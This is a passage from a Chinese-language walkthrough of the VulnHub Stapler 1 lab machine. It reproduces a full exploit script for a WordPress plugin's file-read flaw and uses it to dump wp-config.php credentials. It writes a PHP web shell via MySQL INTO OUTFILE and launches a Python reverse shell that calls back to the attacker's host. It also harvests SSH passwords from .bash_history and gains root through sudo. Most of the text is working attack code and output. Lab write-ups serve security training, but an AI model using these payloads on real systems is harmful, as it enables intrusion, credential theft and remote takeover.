<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/stapler-1<span class="comment"># cat /usr/share/exploitdb/exploits/php/webapps/39646.py</span></span><br><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: Advanced-Video-Embed Arbitrary File Download / Unauthenticated Post Creation</span></span><br><span class="line"><span class="comment"># Google Dork: N/A</span></span><br><span class="line"><span class="comment"># Date: 04/01/2016</span></span><br><span class="line"><span class="comment"># Exploit Author: evait security GmbH</span></span><br><span class="line"><span class="comment"># Vendor Homepage: arshmultani - http://dscom.it/</span></span><br><span class="line"><span class="comment"># Software Link: https://wordpress.org/plugins/advanced-video-embed-embed-videos-or-playlists/</span></span><br><span class="line"><span class="comment"># Version: 1.0</span></span><br><span class="line"><span class="comment"># Tested on: Linux Apache / Wordpress 4.2.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#       Timeline</span></span><br><span class="line"><span class="comment">#       03/24/2016 - Bug discovered</span></span><br><span class="line"><span class="comment">#       03/24/2016 - Initial notification of vendor</span></span><br><span class="line"><span class="comment">#       04/01/2016 - No answer from vendor, public release of bug </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Vulnerable Code (/inc/classes/class.avePost.php) Line 57:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  function ave_publishPost()&#123;</span></span><br><span class="line"><span class="comment">#    $title = $_REQUEST[&#x27;title&#x27;];</span></span><br><span class="line"><span class="comment">#    $term = $_REQUEST[&#x27;term&#x27;];</span></span><br><span class="line"><span class="comment">#    $thumb = $_REQUEST[&#x27;thumb&#x27;];</span></span><br><span class="line"><span class="comment"># &lt;snip&gt;</span></span><br><span class="line"><span class="comment"># Line 78:</span></span><br><span class="line"><span class="comment">#    $image_data = file_get_contents($thumb);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># POC - http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=random&amp;short=1&amp;term=1&amp;thumb=[FILEPATH]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit - Print the content of wp-config.php in terminal (default Wordpress config)</span></span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">import urllib2</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/wordpress&quot;</span> <span class="comment"># insert url to wordpress</span></span><br><span class="line"></span><br><span class="line">randomID = long(random.random() * 100000000000000000L)</span><br><span class="line"></span><br><span class="line">objHtml = urllib2.urlopen(url + <span class="string">&#x27;/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=&#x27;</span> + str(randomID) + <span class="string">&#x27;&amp;short=rnd&amp;term=rnd&amp;thumb=../wp-config.php&#x27;</span>)</span><br><span class="line">content =  objHtml.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        numbers = re.findall(r<span class="string">&#x27;\d+&#x27;</span>,line)</span><br><span class="line">        id = numbers[-1]</span><br><span class="line">        id = int(id) / 10</span><br><span class="line"></span><br><span class="line">objHtml = urllib2.urlopen(url + <span class="string">&#x27;/?p=&#x27;</span> + str(id))</span><br><span class="line">content = objHtml.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;attachment-post-thumbnail size-post-thumbnail wp-post-image&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">                urls=re.findall(<span class="string">&#x27;&quot;(https?://.*?)&quot;&#x27;</span>, line)</span><br><span class="line">                <span class="built_in">print</span> urllib2.urlopen(urls[0]).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure>

<p>修改poc中的ip和文件夹保存后运行poc，下面是修改后的poc脚本内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line">import urllib2</span><br><span class="line">import re</span><br><span class="line">import ssl</span><br><span class="line"></span><br><span class="line">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class="line">url = <span class="string">&quot;https://192.168.56.122:12380/blogblog&quot;</span> <span class="comment"># insert url to wordpress</span></span><br><span class="line"></span><br><span class="line">randomID = long(random.random() * 100000000000000000L)</span><br><span class="line"></span><br><span class="line">objHtml = urllib2.urlopen(url + <span class="string">&#x27;/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=&#x27;</span> + str(randomID) + <span class="string">&#x27;&amp;short=rnd&amp;term=rnd&amp;thumb=../wp-config.php&#x27;</span>)</span><br><span class="line">content =  objHtml.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">    numbers = re.findall(r<span class="string">&#x27;\d+&#x27;</span>,line)</span><br><span class="line">    id = numbers[-1]</span><br><span class="line">    id = int(id) / 10</span><br><span class="line"></span><br><span class="line">objHtml = urllib2.urlopen(url + <span class="string">&#x27;/?p=&#x27;</span> + str(id))</span><br><span class="line">content = objHtml.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;attachment-post-thumbnail size-post-thumbnail wp-post-image&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">        urls=re.findall(<span class="string">&#x27;&quot;(https?://.*?)&quot;&#x27;</span>, line)</span><br><span class="line">        <span class="built_in">print</span> urllib2.urlopen(urls[0]).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure>

<p>运行poc后没有任何输出，但是在<span class="exturl" data-url="aHR0cHM6Ly8xOTIuMTY4LjU2LjEyMjoxMjM4MC9ibG9nYmxvZy93cC1jb250ZW50L3VwbG9hZHMvJUU3JTlCJUFFJUU1JUJEJTk1JUU0JUI4JThCJUU2JTk2JUIwJUU1JUEyJTlFJUU0JUJBJTg2JUU0JUI4JTgwJUU0JUI4JUFBOTU3NTUwMTcyLmpwZWclRTYlOTYlODclRTQlQkIlQjYlRUYlQkMlOEMlRTQlQjglOEIlRTglQkQlQkQlRTYlQUQlQTQlRTYlOTYlODclRTQlQkIlQjYlRTUlQjklQjYlRTYlOUYlQTUlRTclOUMlOEIlRTklODclOEMlRTklOUQlQTIlRTclOUElODQlRTUlODYlODUlRTUlQUUlQjk=">https://192.168.56.122:12380/blogblog/wp-content/uploads/目录下新增了一个957550172.jpeg文件，下载此文件并查看里面的内容<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/stapler-1<span class="comment"># cat 957550172.jpeg </span></span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configurations of the WordPress.</span><br><span class="line"> *</span><br><span class="line"> * This file has the following configurations: MySQL settings, Table Prefix,</span><br><span class="line"> * Secret Keys, and ABSPATH. You can find more information by visiting</span><br><span class="line"> * &#123;@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php&#125;</span><br><span class="line"> * Codex page. You can get the MySQL settings from your web host.</span><br><span class="line"> *</span><br><span class="line"> * This file is used by the wp-config.php creation script during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can just copy this file</span></span><br><span class="line"><span class="string"> * to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>wordpress<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>root<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database password */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>plbkac<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL hostname */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_HOST<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_CHARSET<span class="string">&#x27;, &#x27;</span>utf8mb4<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** The Database Collate type. Don&#x27;</span>t change this <span class="keyword">if</span> <span class="keyword">in</span> doubt. */</span><br><span class="line">define(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@+</span></span><br><span class="line"> * Authentication Unique Keys and Salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases!</span><br><span class="line"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="line"> * You can change these at any point <span class="keyword">in</span> time to invalidate all existing cookies. This will force all users to have to <span class="built_in">log</span> <span class="keyword">in</span> again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define(<span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;V 5p=[.Vds8~SX;&gt;t)++Tt57U6&#123;Xe`T|oW^eQ!mHr &#125;]&gt;9RX07W&lt;sZ,I~`6Y5-T:&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;vJZq=p.Ug,]:&lt;-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+&#125;&amp;!/#&gt;4#K7eFP5-av`n)2&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;ql-Vfg[?v6&#123;ZR*+O)|Hf OpPWYfKX0Jmpl8zU&lt;cr.wm?|jqZH:YMv;zu@tM7P:4o&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;j|V8J.~n&#125;R2,mlU%?C8o2[~6Vo1&#123;Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;I&#123;gDlDs`Z@.+/AdyzYw4%+&lt;WsO-LDBHT&#125;&gt;&#125;!||Xrf@1E6jJNV=&#123;p1?yMKYec*OI$&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;.HJmx^zb];5P&#125;hM-uJ%^+9=0SBQEh[[*&gt;#z+p&gt;nVi10`XOUq (Zml~op3SG4OG_D&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&amp;_nP4&#123;D&#125;n=y=FQt%zJw&gt;c[a+;ppCzIkt;&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;tb(&#125;BfgB7l!rhDVm&#123;eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each a unique</span><br><span class="line"> * prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span>  = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> */</span><br><span class="line">define(<span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy blogging. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( !defined(&#x27;</span>ABSPATH<span class="string">&#x27;) )</span></span><br><span class="line"><span class="string">        define(&#x27;</span>ABSPATH<span class="string">&#x27;, dirname(__FILE__) . &#x27;</span>/<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once(ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">define(&#x27;</span>WP_HTTP_BLOCK_EXTERNAL<span class="string">&#x27;, true);</span></span><br></pre></td></tr></table></figure>

<p>找到mysql数据库的账号和密码：root/plbkac，接下来连接数据库</p>
<p>首先猜测网站绝对路径如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MySQL [wordpress]&gt; select load_file(<span class="string">&#x27;/var/www/https/robots.txt&#x27;</span>);</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">| load_file(<span class="string">&#x27;/var/www/https/robots.txt&#x27;</span>)                      |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">| User-agent: *</span><br><span class="line">Disallow: /admin112233/</span><br><span class="line">Disallow: /blogblog/</span><br><span class="line"> |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>使用以下myssql语句写入木马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MySQL [wordpress]&gt; Select <span class="string">&quot;&lt;?php echo shell_exec(<span class="variable">$_GET</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span> into outfile <span class="string">&quot;/var/www/https/blogblog/wp-content/uploads/shell.php&quot;</span>;</span><br><span class="line">Query OK, 1 row affected (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>成功写入木马并能执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://192.168.56.122:12380/blogblog/wp-content/uploads/shell.php?cmd=id</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub253.jpg"></li>
</ul>
<p>现在执行下面命令来反弹一个shell</p>
<p>浏览器执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://192.168.56.122:12380/blogblog/wp-content/uploads/shell.php?cmd=python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.102&quot;,5566));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>kali端，成功的弹回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.122: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.122] 54522</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/var/www/https/blogblog/wp-content/uploads</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty;pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">www-data@red:/var/www/https/blogblog/wp-content/uploads$ id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">www-data@red:/var/www/https/blogblog/wp-content/uploads$ whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br></pre></td></tr></table></figure>

<p>使用下面的命令尝试找出ssh的账号密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@red:/$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line">www-data@red:/$ find -name <span class="string">&quot;.bash_history&quot;</span> -<span class="built_in">exec</span> cat &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">find -name <span class="string">&quot;.bash_history&quot;</span> -<span class="built_in">exec</span> cat &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">...</span><br><span class="line">sshpass -p thisimypassword ssh JKanode@localhost</span><br><span class="line">apt-get install sshpass</span><br><span class="line">sshpass -p JZQuyIN5 peter@localhost</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>发现下面两个账号密码均能成功登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">JKanode    thisimypassword</span><br><span class="line">peter      JZQuyIN5</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh JKanode@192.168.56.122</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.122 (192.168.56.122)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.56.122<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">-----------------------------------------------------------------</span></span><br><span class="line"><span class="string">~          Barry, don&#x27;</span>t forget to put a message here           ~</span><br><span class="line">-----------------------------------------------------------------</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">JKanode@192.168.56.122<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome back!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Ubuntu system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span></span><br><span class="line"><span class="string">applicable law.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">JKanode@red:~$ id</span></span><br><span class="line"><span class="string">uid=1013(JKanode) gid=1013(JKanode) groups=1013(JKanode)</span></span><br><span class="line"><span class="string">JKanode@red:~$ whoami</span></span><br><span class="line"><span class="string">JKanode</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh peter@192.168.56.122</span></span><br><span class="line">-----------------------------------------------------------------</span><br><span class="line">~          Barry, don<span class="string">&#x27;t forget to put a message here           ~</span></span><br><span class="line"><span class="string">-----------------------------------------------------------------</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">peter@192.168.56.122&#x27;</span>s password: </span><br><span class="line">Welcome back!</span><br><span class="line"></span><br><span class="line">This is the Z Shell configuration <span class="keyword">function</span> <span class="keyword">for</span> new users,</span><br><span class="line">zsh-newuser-install.</span><br><span class="line">You are seeing this message because you have no zsh startup files</span><br><span class="line">(the files .zshenv, .zprofile, .zshrc, .zlogin <span class="keyword">in</span> the directory</span><br><span class="line">~).  This <span class="keyword">function</span> can <span class="built_in">help</span> you with a few settings that should</span><br><span class="line">make your use of the shell easier.</span><br><span class="line"></span><br><span class="line">You can:</span><br><span class="line"></span><br><span class="line">(q)  Quit and <span class="keyword">do</span> nothing.  The <span class="keyword">function</span> will be run again next time.</span><br><span class="line"></span><br><span class="line">(0)  Exit, creating the file ~/.zshrc containing just a comment.</span><br><span class="line">     That will prevent this <span class="keyword">function</span> being run again.</span><br><span class="line"></span><br><span class="line">(1)  Continue to the main menu.</span><br><span class="line"></span><br><span class="line">(2)  Populate your ~/.zshrc with the configuration recommended</span><br><span class="line">     by the system administrator and <span class="built_in">exit</span> (you will need to edit</span><br><span class="line">     the file by hand, <span class="keyword">if</span> so desired).</span><br><span class="line"></span><br><span class="line">--- Type one of the keys <span class="keyword">in</span> parentheses ---</span><br><span class="line">Aborting.</span><br><span class="line">The <span class="keyword">function</span> will be run again next time.  To prevent this, execute:</span><br><span class="line">  touch ~/.zshrc</span><br><span class="line">red%</span><br><span class="line">red% id</span><br><span class="line">uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)</span><br><span class="line">red% whoami</span><br><span class="line">peter</span><br></pre></td></tr></table></figure>

<p>执行下面的命令利用peter用户提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">red% sudo usermod -s /bin/bash</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the <span class="built_in">local</span> System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> peter: </span><br><span class="line">Usage: usermod [options] LOGIN</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -c, --comment COMMENT         new value of the GECOS field</span><br><span class="line">  -d, --home HOME_DIR           new home directory <span class="keyword">for</span> the user account</span><br><span class="line">  -e, --expiredate EXPIRE_DATE  <span class="built_in">set</span> account expiration date to EXPIRE_DATE</span><br><span class="line">  -f, --inactive INACTIVE       <span class="built_in">set</span> password inactive after expiration</span><br><span class="line">                                to INACTIVE</span><br><span class="line">  -g, --gid GROUP               force use GROUP as new primary group</span><br><span class="line">  -G, --groups GROUPS           new list of supplementary GROUPS</span><br><span class="line">  -a, --append                  append the user to the supplemental GROUPS</span><br><span class="line">                                mentioned by the -G option without removing</span><br><span class="line">                                him/her from other groups</span><br><span class="line">  -h, --<span class="built_in">help</span>                    display this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -l, --login NEW_LOGIN         new value of the login name</span><br><span class="line">  -L, --lock                    lock the user account</span><br><span class="line">  -m, --move-home               move contents of the home directory to the</span><br><span class="line">                                new location (use only with -d)</span><br><span class="line">  -o, --non-unique              allow using duplicate (non-unique) UID</span><br><span class="line">  -p, --password PASSWORD       use encrypted password <span class="keyword">for</span> the new password</span><br><span class="line">  -R, --root CHROOT_DIR         directory to chroot into</span><br><span class="line">  -s, --shell SHELL             new login shell <span class="keyword">for</span> the user account</span><br><span class="line">  -u, --uid UID                 new UID <span class="keyword">for</span> the user account</span><br><span class="line">  -U, --unlock                  unlock the user account</span><br><span class="line">  -v, --add-subuids FIRST-LAST  add range of subordinate uids</span><br><span class="line">  -V, --del-subuids FIRST-LAST  remove range of subordinate uids</span><br><span class="line">  -w, --add-subgids FIRST-LAST  add range of subordinate gids</span><br><span class="line">  -W, --del-subgids FIRST-LAST  remove range of subordinate gids</span><br><span class="line">  -Z, --selinux-user SEUSER     new SELinux user mapping <span class="keyword">for</span> the user account</span><br><span class="line"></span><br><span class="line">red% id</span><br><span class="line">uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)</span><br><span class="line">red% whoami</span><br><span class="line">peter</span><br><span class="line">red% sudo -i</span><br><span class="line">➜  ~ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">➜  ~ whoami</span><br><span class="line">root</span><br><span class="line">➜  ~ <span class="built_in">cd</span> /root</span><br><span class="line">➜  ~ ls</span><br><span class="line">fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql</span><br><span class="line">➜  ~ cat flag.txt</span><br><span class="line">~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~</span><br><span class="line">                          .-<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;-.</span></span><br><span class="line"><span class="string">                          |&#x27;</span>-----<span class="string">&#x27;|</span></span><br><span class="line"><span class="string">                          |-.....-|</span></span><br><span class="line"><span class="string">                          |       |</span></span><br><span class="line"><span class="string">                          |       |</span></span><br><span class="line"><span class="string">         _,._             |       |</span></span><br><span class="line"><span class="string">    __.o`   o`&quot;-.         |       |</span></span><br><span class="line"><span class="string"> .-O o `&quot;-.o   O )_,._    |       |</span></span><br><span class="line"><span class="string">( o   O  o )--.-&quot;`O   o&quot;-.`&#x27;</span>-----<span class="string">&#x27;`</span></span><br><span class="line"><span class="string"> &#x27;</span>--------<span class="string">&#x27;  (   o  O    o)  </span></span><br><span class="line"><span class="string">              `----------`</span></span><br><span class="line"><span class="string">b6b545dc11b7a270f4bad23432190c75162c4a2b</span></span><br></pre></td></tr></table></figure>

<p>成功的获取到了root用户的权限并拿到了flag</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub254.jpg"></li>
</ul>
<h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><p>也可以访问wordpress数据库后然后选择用户john并破解hash值，它将是“不正确的”使用用户“john”和密码“incorrect”访问wordpress然后导航以添加插件，然后上传shell，将在/blogblog/wp-content/uploads目录中找到shell</p>
<p>使用nc作为侦听器建立连接之后，还可以使用下面的方法进行提权</p>
<ul>
<li><p>提权参考1 <span class="exturl" data-url="aHR0cHM6Ly9idWdzLmNocm9taXVtLm9yZy9wL3Byb2plY3QtemVyby9pc3N1ZXMvZGV0YWlsP2lkPTgwOA==">Linux-UAF通过bpf-BPF-PROG-LOAD-错误路径中的double-fdput<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>提权参考2 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzk3NzI=">Linux内核4.4.x-Ubuntu-16.04-double-fdput-bpf-BPF_PROG_LOAD-提权<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
<p><font color="red">其它更多方法请自行尝试。。。</font></p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>wordpress用户枚举</li>
<li>WordPress Plugin Advanced Video 1.0 - 本地文件包含</li>
<li>python poc修改</li>
<li>select load_file(‘/var/www/https/robots.txt’); mysql语句读取文件内容</li>
<li>select “php木马内容” into outfile “/var/www/https/blogblog/wp-content/uploads/shell.php”; mysql语句写入木马</li>
<li>python脚本反弹shell</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.102&quot;,5566));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>find命令寻找登录的历史ssh密码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find -name <span class="string">&quot;.bash_history&quot;</span> -<span class="built_in">exec</span> cat &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<ul>
<li>sudo -i提权</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo usermod -s /bin/bash</span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure>
<ul>
<li>Linux内核4.4.x-Ubuntu-16.04-double-fdput-bpf-BPF_PROG_LOAD-提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
